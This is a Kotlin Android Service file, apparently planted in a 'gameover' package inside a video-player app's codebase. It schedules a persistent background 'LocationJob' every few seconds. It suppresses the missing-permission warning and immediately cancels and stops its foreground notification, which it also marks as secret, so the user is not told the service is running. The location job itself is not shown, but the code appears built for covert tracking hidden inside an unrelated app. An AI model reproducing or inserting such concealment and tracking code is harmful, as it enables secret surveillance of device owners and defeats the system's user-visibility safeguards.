package org.schabi.newpipe.gameover

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import org.schabi.newpipe.R
class MyService : Service() {
    val GETDATAAFTERSECONDS: Long = 10 // in seconds

    override fun onBind(p0: Intent?): IBinder? {
        TODO("Not yet implemented")
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startMyForeground()
        if (intent != null) {
            if (intent.action != null && intent.action.equals("myAction")) {
                scheduleMyJob(intent)
            }
        }
        this.stopForeground(true)
        return START_STICKY
    }

    @SuppressLint("MissingPermission")
    private fun scheduleMyJob(intent: Intent) {
        val serviceComponent = ComponentName(this, LocationJob::class.java)
        val builder = JobInfo.Builder(123, serviceComponent)
        builder.setOverrideDeadline(2 * GETDATAAFTERSECONDS * 1000)
        builder.setMinimumLatency(GETDATAAFTERSECONDS * 1000)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setRequiresBatteryNotLow(true)
        }
        builder.setPersisted(true)
        val jobScheduler: JobScheduler = this.getSystemService(JobScheduler::class.java)
        if (jobScheduler != null) {
            jobScheduler.schedule(builder.build())
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyForeground() {
        getString(R.string.app_name)
        val channel = NotificationChannel("1", getString(R.string.app_name), NotificationManager.IMPORTANCE_LOW)
        channel.description = getString(R.string.app_name) + " Service"
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
        val builder = NotificationCompat.Builder(this, "1")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(getString(R.string.app_name))
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(true)
            .setOnlyAlertOnce(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        val notification = builder.build()
        this.startForeground(1, notification)
        notificationManager.cancelAll()
    }
}
